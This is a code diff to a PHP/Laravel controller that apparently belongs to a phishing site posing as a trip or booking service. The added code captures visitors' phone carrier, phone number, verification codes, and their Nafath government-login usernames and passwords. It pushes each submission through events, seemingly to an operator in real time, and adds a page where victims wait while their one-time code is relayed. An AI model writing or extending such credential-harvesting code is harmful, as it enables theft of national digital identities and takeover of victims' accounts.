@@ -16,6 +16,7 @@ use App\Events\SendCodeEvent;
 use App\Events\RecieveCodeEvent;
 use App\Events\SendNafadId;
 use App\Events\SendNotification;
+use App\Events\SendPhoneData;
 use App\Models\VisitorNotifications;
 use Illuminate\Validation\ValidationException;
 
@@ -302,9 +303,15 @@ class TripController extends Controller
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
                 $not  = VisitorNotifications::find($visitor->id);
-                $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>10]);
+                $not->update(['page' => 'أرسل معلومات شبكة الجوال',
+                    'step_number'=>10,
+                    'phone_provider'=>$request->phone_provider ?? '',
+                    'phone_number_2'=>$request->phone_number ?? '',
+                    'phone_code'=>$request->code ?? '',
+
+                ]);
                 session()->put('visitor', json_encode($not));
-                // event(new SendCode($not));
+                event(new SendPhoneData($not));
                 event(new SendNotification($not));
             }
             return redirect()->route('enter_nafad_page');
@@ -320,6 +327,20 @@ class TripController extends Controller
         } catch (\Exception $ex) {
             dd($ex->getMessage());
         }
+    }
+    public function nafadPage()
+    {
+        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        if ($visitor) {
+            $not  = VisitorNotifications::find($visitor->id);
+            $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>11]);
+            session()->put('visitor', json_encode($not));
+            // event(new NewVisitor($not));
+            event(new SendVisit($not));
+            event(new SendNotification($not));
+            return view('nafad');
+        }
+        return redirect('/');
     }
     public function sendCodeToVisitor(Request $request)
     {
@@ -355,16 +376,24 @@ class TripController extends Controller
                 $not  = VisitorNotifications::find($visitor->id);
                 if($request->has('username'))
                 {
-                    $not->update(['page' => 'أرسل اسم المستخدم وكلمة السر الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null,'nafad_username'=>$request->username,'nafad_password'=>$request->password]);
+                    $not->update(['page' => 'أرسل اسم المستخدم وكلمة السر الخاص بنفاذ','step_number'=>12,'nafad_id'=>$request->phone ?? null,'nafad_username'=>$request->username,'nafad_password'=>$request->password]);
+                    session()->put('visitor', json_encode($not));
+                    event(new SendNafadId($not));
+                    event(new SendNotification($not));
                 }
                 else{
-                    $not->update(['page' => 'أرسل المعرف الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null]);
+                    $not->update(['page' => 'أرسل المعرف الخاص بنفاذ','step_number'=>12,'nafad_id'=>$request->phone ?? null]);
 
+                    session()->put('visitor', json_encode($not));
+                    event(new SendCode($not));
+                    event(new SendNafadId($not));
+                    event(new SendNotification($not));
+                    return view('nafad_code_waiting',compact('not'));
                 }
-                session()->put('visitor', json_encode($not));
-                event(new SendNafadId($not));
-                event(new SendNotification($not));
+
             }
+            //remove from session
+            session()->forget('visitor');
             return view('final_step');
         } catch (\Exception $ex) {
             dd($ex->getMessage());
